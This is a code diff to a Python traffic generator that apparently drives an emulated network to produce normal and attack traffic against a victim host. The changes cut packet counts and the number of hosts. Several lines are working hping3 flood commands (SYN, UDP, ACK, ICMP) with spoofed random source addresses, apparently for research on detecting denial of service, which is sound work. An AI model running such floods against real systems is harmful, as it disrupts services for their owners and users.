@@ -20,8 +20,10 @@ class Generator:
         self.h8 = net.get('h8')
         self.h9 = net.get('h9')
 
-        self.users = [self.h2, self.h3, self.h4, self.h6, self.h7, self.h8]
-        self.attackers = [self.h1, self.h9]
+        # self.users = [self.h2, self.h3, self.h4, self.h6, self.h7, self.h8]
+        # self.attackers = [self.h1, self.h9]
+        self.users = [self.h4]
+        self.attackers = [self.h6]
         self.victim = [self.h5]
 
         self.config = Config()
@@ -44,10 +46,10 @@ class Generator:
             dst_ip = self.victim[0].IP()
             
             src.cmd('cd downloads')
-            src.cmd("ping {} -c 10000 -i {} &".format(dst_ip, rate1))
+            src.cmd("ping {} -c 100 -i {} &".format(dst_ip, rate1))
             # src.cmd("iperf -p 5050 -c {} &".format(dst_ip)) 
-            src.cmd("hping3 -S -c 10000 -i u{} -e 'NormalTCPTraffic' -p 5050 {} &".format(rate2, dst_ip))
-            src.cmd("hping3 -2 -c 10000 -i u{} -e 'NormalUDPTraffic' -p 5051 {} &".format(rate2, dst_ip))
+            src.cmd("hping3 -S -c 100 -i u{} -e 'NormalTCPTraffic' -p 5050 {} &".format(rate2, dst_ip))
+            # src.cmd("hping3 -2 -c 100 -i u{} -e 'NormalUDPTraffic' -p 5051 {} &".format(rate2, dst_ip))
             
             # src.cmd("wget http://{}/index.html &".format(dst_ip))
             # src.cmd("killall -9 wget")
@@ -58,10 +60,10 @@ class Generator:
         rate = 1000000/rate
         dst_ip = self.victim[0].IP()
         for attacker in self.attackers:
-            attacker.cmd("hping3 -c 10000 -S -V -d 120 -w 64 -p 80 --rand-source -i u{} -e 'SYNFloodAttack' {} &".format(rate, dst_ip))
-            attacker.cmd("hping3 -c 10000 -2 -V -d 120 -w 64 --rand-source -i u{} -e 'UDPFloodAttack' {} &".format(rate, dst_ip))
+            attacker.cmd("hping3 -c 100 -S -V -d 120 -w 64 -p 80 --rand-source -i u{} -e 'SYNFloodAttack' {} &".format(rate, dst_ip))
+            # attacker.cmd("hping3 -c 100 -2 -V -d 120 -w 64 --rand-source -i u{} -e 'UDPFloodAttack' {} &".format(rate, dst_ip))
             # attacker.cmd("hping3 -c 10000 -1 -V -d 120 -w 64 --rand-source -i u{} -e 'ICMPFloodAttack' {} &".format(rate, dst_ip))
-            attacker.cmd("hping3 -c 10000 -A -V -d 120 -w 64 --rand-source -i u{} -e 'ACKFloodAttack' {} &".format(rate, dst_ip))
+            attacker.cmd("hping3 -c 100 -A -V -d 120 -w 64 --rand-source -i u{} -e 'ACKFloodAttack' {} &".format(rate, dst_ip))
 
 
     def syn_flood(self, level='default'):
